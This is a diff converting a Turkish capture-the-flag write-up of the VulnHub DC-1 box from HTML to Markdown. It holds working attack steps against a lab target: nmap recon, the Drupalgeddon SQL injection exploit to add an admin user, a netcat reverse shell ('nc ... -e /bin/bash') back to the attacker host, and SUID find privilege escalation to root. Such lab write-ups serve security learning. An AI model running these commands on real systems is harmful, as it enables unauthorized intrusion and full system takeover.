@@ -1,16 +1,17 @@
-<h1>DC-1: 1 Kutusunun Çözümü</h1>
-<strong>Yazar:<strong>Beren Kuday GÖRÜN<br>
-<strong>Tarih:</strong>06.05.2019<br>
-<strong>IP:</strong>192.168.171.136<br>
-<strong>Not:</strong>Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.<br>
-<strong>Sayfa:</strong>https://www.vulnhub.com/entry/dc-1-1,292/
-<hr>
-<h3>1.	Bilgi Toplama</h3>
-<h4>IP Tespiti</h4>
-<pre>
+# DC-1: 1 Kutusunun Çözümü
+**Yazar:** Beren Kuday GÖRÜN
+**Tarih:**06.05.2019
+**IP:**192.168.171.136
+**Not:**Kutunun indirme adresi 'kutu' isimli klasöre eklenmiştir.
+**Sayfa:**https://www.vulnhub.com/entry/dc-1-1,292/
+
+## 1.	Bilgi Toplama
+### IP Tespiti
+```sh
 arp-scan -l
-</pre>
-<pre>
+```
+
+```sh
 Interface: eth0, datalink type: EN10MB (Ethernet)
 Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.171.1	00:50:56:c0:00:08	VMware, Inc.
@@ -20,11 +21,13 @@ Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)
 
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.9.5: 256 hosts scanned in 2.717 seconds (94.22 hosts/sec). 4 responded
-</pre>
-<p>Heden kutunun IP adresi 192.168.171.138</p>
-<h4>Servis Tespiti</h4>
-<pre>nmap -p- -A 192.168.171.138</pre>
-<pre>
+```
+Heden kutunun IP adresi 192.168.171.138
+### Servis Tespiti
+```sh
+nmap -p- -A 192.168.171.138
+```
+```sh
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-06 14:34 EDT
 Nmap scan report for 192.168.171.138
 Host is up (0.00064s latency).
@@ -65,13 +68,15 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.13 seconds
-</pre>
-<p>22. portta ssh olduğunu gördükten sonra ilk olarak root kullanıcısı için hydra ile bruteforce saldırısını başlattım. Ancak bir sonuç çıkartamadım. Daha sonrasında 80. porta yöneldim ve sayfayı gördüğümde bunun bir Drupal sitesi olduğunu gördüm. Üniversite 2. sınıfta Bilgi İşlem Departmanında yarı zamanlı çalışırken kullandığımız bir web uygulamasıydı. Kısaca özet geçecek olursam wordpress gibi bir uygulama ama daha çok CMS sistemleri için geliştirilmiş ve bireysel sitelerden ziyade kurumları baz alan bir platform. Güvenlik açısından eklentiri wordpress'ten çok çok daha iyidir. Eklenti olarak üzerinde WAF uygulamaları vardır. Olası saldırılarda IP adreslerinin otomatik olarak bloke edilmesi gibi ücretsiz özellikleri bulunuyor. Bunun haricinde yanlış hatırlamıyorsa wordpress'e karşın bütün eklentileri ücretsizdi diye hatırlıyorum. Hedef üzerinde Drupal olması beni motive etti, tecrübeler iyidir.</p>
-<p>İlk olarak tabikide wordpress'te olduğu gibi robots.txt dosyasını kontrol etmek mantıklı olacaktır. Burada bir sürü bağlantı görülecektir. Ancak bazı linklere MiddleWare yüzünden ulaşamayacağız. Her şey tanıdık geliyor.</p>
-<p>Belirli bir uygulama barındıran zafiyetli kutularda aslında yapımcı kişinin hayal gücümüzü kullanarak bir açık bulmaktan ziyade uygulamanın açıklarını araştırmaya bizi yönelttiğini düşünüyorum bundan dolayı nmap çıktısı ile aldığım sonuçlarda Drupal 7 olduğunu gördüm ve bu şekilde açık kaynaklardan exploit araması yaparak yola devam edelim.</p>
+```
+22. portta ssh olduğunu gördükten sonra ilk olarak root kullanıcısı için hydra ile bruteforce saldırısını başlattım. Ancak bir sonuç çıkartamadım. Daha sonrasında 80. porta yöneldim ve sayfayı gördüğümde bunun bir Drupal sitesi olduğunu gördüm. Üniversite 2. sınıfta Bilgi İşlem Departmanında yarı zamanlı çalışırken kullandığımız bir web uygulamasıydı. Kısaca özet geçecek olursam wordpress gibi bir uygulama ama daha çok CMS sistemleri için geliştirilmiş ve bireysel sitelerden ziyade kurumları baz alan bir platform. Güvenlik açısından eklentiri wordpress'ten çok çok daha iyidir. Eklenti olarak üzerinde WAF uygulamaları vardır. Olası saldırılarda IP adreslerinin otomatik olarak bloke edilmesi gibi ücretsiz özellikleri bulunuyor. Bunun haricinde yanlış hatırlamıyorsa wordpress'e karşın bütün eklentileri ücretsizdi diye hatırlıyorum. Hedef üzerinde Drupal olması beni motive etti, tecrübeler iyidir.
+İlk olarak tabikide wordpress'te olduğu gibi robots.txt dosyasını kontrol etmek mantıklı olacaktır. Burada bir sürü bağlantı görülecektir. Ancak bazı linklere MiddleWare yüzünden ulaşamayacağız. Her şey tanıdık geliyor.
+Belirli bir uygulama barındıran zafiyetli kutularda aslında yapımcı kişinin hayal gücümüzü kullanarak bir açık bulmaktan ziyade uygulamanın açıklarını araştırmaya bizi yönelttiğini düşünüyorum bundan dolayı nmap çıktısı ile aldığım sonuçlarda Drupal 7 olduğunu gördüm ve bu şekilde açık kaynaklardan exploit araması yaparak yola devam edelim.
 
-<pre>searchsploit drupal 7</pre>
-<pre>
+```sh
+searchsploit drupal 7
+```
+```sh
 --------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                 |  Path
                                                                | (/usr/share/exploitdb/)
@@ -100,12 +105,12 @@ Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasplo | exploits/php/re
 Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclos | exploits/php/webapps/44501.txt
 --------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
-</pre>
-<p>'Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin Us | exploits/php/webapps/34992.py' satırındaki python kodunu kullanabiliriz.</p>
-<pre>
+```
+'Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin Us | exploits/php/webapps/34992.py' satırındaki python kodunu kullanabiliriz.
+```sh
 python /usr/share/exploitdb/exploits/php/webapps/34992.py -h
-</pre>
-<pre>
+```
+```sh
 Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS
 
 
@@ -116,15 +121,15 @@ Options:
   -u USERNAME, --username=USERNAME
                         Insert username
   -p PWD, --pwd=PWD     Insert password
-</pre>
-<p>İsterleri doldurarak kodu çalıştıralım...</p>
+```
+İsterleri doldurarak kodu çalıştıralım...
 
-<hr>
-<h3>3	Sisteme Sızma</h3>
-<pre>
+
+## 3	Sisteme Sızma
+```sh
 python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.138 -u kuday -p kuday
-</pre>
-<pre>
+```
+```sh
   ______                          __     _______  _______ _____    
  |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
  |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
@@ -171,24 +176,30 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 [*] Pass: kuday
 [*] Url: http://192.168.171.138/?q=node&destination=node
 
-</pre>
-<p>Yukarıdaki bağlantıya giderek kullanıcı adı ve şifremiz ile sisteme giriş yapalım.</p>
-<p>Sisteme giriş yaptıktan sonra menü kısmından Modules<br>Açılan sayfada ise Install new module bağlantısına tıklayarak modüle yükleme sayfasına ilerledim.</p>
-<p>Bunu neden yaptık peki? Üst kısımlarda Drupal'ı anlatırken eklentilerinin ücretsiz olduğunu belirtmiştim. https://www.drupal.org/project/shell adresinden modülü direkt olarka indirebilirsiniz ya da https://ftp.drupal.org/files/projects/shell-7.x-1.0-beta5.tar.gz adresini kullanabilirsiniz.<br>ÖNEMLİ NOT: Unutmayınki biizm uygulamamızın sürüm 7, eğer 8. sürüm için yazılmış bir shell modülü indirip yüklemeye çalışırsanız başarılı olmayacaktır.</p>
-<p>Şimdi tekrardan Modules kısmında gelerek ismi Shell olan modülümüzü etkinleştirmemiz gerekmektedir. Bu işlemi yaptıktan sonra Konfigürasyon Ayarlarımızı kaydetmemiz gerekmektedir.</p>
-<p>Şimdi Dashboard->kuday->Shell şeklinde ilerleyerek. Kabuğumuza ulaşıyoruz. Artık reverse shell alma vakti. Shell'e aşağıdaki kodu yazabilir ya da istediğiniz bir shell kodu yazabilirsiniz. İçeride gezindiğinizde bazı flagler göreceksinizdir. Flaglere yönelmekten ziyade amacımız root olmak olacaktır.</p>
-<p>Tabiki ilk onca gelecek bağlantıyı yakalayabilmek için bir dinleme noktası açmalıyız.</p>
-<pre>nc -lvp 1822</pre>
-<p>Şimdi aşağıdaki kodu karşı hedefe yazalım.</p>
-<pre>nc 192.168.171.136 1822 -e /bin/bash</pre>
+```
+Yukarıdaki bağlantıya giderek kullanıcı adı ve şifremiz ile sisteme giriş yapalım.
+Sisteme giriş yaptıktan sonra menü kısmından ModulesAçılan sayfada ise Install new module bağlantısına tıklayarak modüle yükleme sayfasına ilerledim.
+Bunu neden yaptık peki? Üst kısımlarda Drupal'ı anlatırken eklentilerinin ücretsiz olduğunu belirtmiştim. https://www.drupal.org/project/shell adresinden modülü direkt olarka indirebilirsiniz ya da https://ftp.drupal.org/files/projects/shell-7.x-1.0-beta5.tar.gz adresini kullanabilirsiniz.ÖNEMLİ NOT: Unutmayınki biizm uygulamamızın sürüm 7, eğer 8. sürüm için yazılmış bir shell modülü indirip yüklemeye çalışırsanız başarılı olmayacaktır.
+Şimdi tekrardan Modules kısmında gelerek ismi Shell olan modülümüzü etkinleştirmemiz gerekmektedir. Bu işlemi yaptıktan sonra Konfigürasyon Ayarlarımızı kaydetmemiz gerekmektedir.
+Şimdi Dashboard->kuday->Shell şeklinde ilerleyerek. Kabuğumuza ulaşıyoruz. Artık reverse shell alma vakti. Shell'e aşağıdaki kodu yazabilir ya da istediğiniz bir shell kodu yazabilirsiniz. İçeride gezindiğinizde bazı flagler göreceksinizdir. Flaglere yönelmekten ziyade amacımız root olmak olacaktır.
+Tabiki ilk onca gelecek bağlantıyı yakalayabilmek için bir dinleme noktası açmalıyız.
+```sh
+nc -lvp 1822
+```
+Şimdi aşağıdaki kodu karşı hedefe yazalım.
+```sh
+nc 192.168.171.136 1822 -e /bin/bash
+```
 
 
 
-<hr>
-<h3>4	Yetki Yükseltme</h3>
-<p>Kernel için exploit aradım ancak bir şey bulamadım. Bunda dolayı suid biti etken olan dosyaları aramaya karar verdim. </p>
-<pre>find / -perm -u=s -type f</pre>
-<pre>
+
+## 4	Yetki Yükseltme
+Kernel için exploit aradım ancak bir şey bulamadım. Bunda dolayı suid biti etken olan dosyaları aramaya karar verdim. 
+```sh
+find / -perm -u=s -type f
+```
+```sh
 /bin/mount
 /bin/ping
 /bin/su
@@ -208,34 +219,42 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /sbin/mount.nfs
-</pre>
+```
 
-<p>Bingo! find aracının -exec parametresi var. Bunu sömürebiliriz. Konudan bağımsız istihza'da da dediği gibi exec şeytani bir fonksiyondur! </p>
-<pre>find -exec '/bin/sh' \;</pre>
-<pre>whoami</pre>
-<pre>
+Bingo! find aracının -exec parametresi var. Bunu sömürebiliriz. Konudan bağımsız istihza'da da dediği gibi exec şeytani bir fonksiyondur! 
+```sh
+find -exec '/bin/sh' \;
+```
+```sh
+whoami
+```
+```sh
 root
-</pre>
-<p>/root içerisinde son flag isimli bir dosya var. Hiç flag bulmadan son flag'e ulaşmak değişik oldu :)</p>
-<pre>
-cd /root</pre>
-<pre>ls
+```
+/root içerisinde son flag isimli bir dosya var. Hiç flag bulmadan son flag'e ulaşmak değişik oldu :)
+```sh
+cd /root
+```
+```sh
+ls
 thefinalflag.txt
-</pre><pre>
-cat thefinalflag.txt</pre><pre>
+```
+```sh
+cat thefinalflag.txt
+```
+```sh
 Well done!!!!
 
 Hopefully you've enjoyed this and learned some new skills.
 
 You can let me know what you thought of this little journey
 by contacting me via Twitter - @DCAU7
-</pre>
+```
 
-<hr>
-<h4>Kaynaklar:<h4>
-<pre>
+
+### Kaynaklar:### 
+
 https://www.syslogs.org/suid-ve-sgid-bitler-ve-bu-bitlere-sahip-dosyalarin-bulunmasi/
 https://www.drupalturkiye.org/drupal/drupal-nedir
 
-</pre>
 
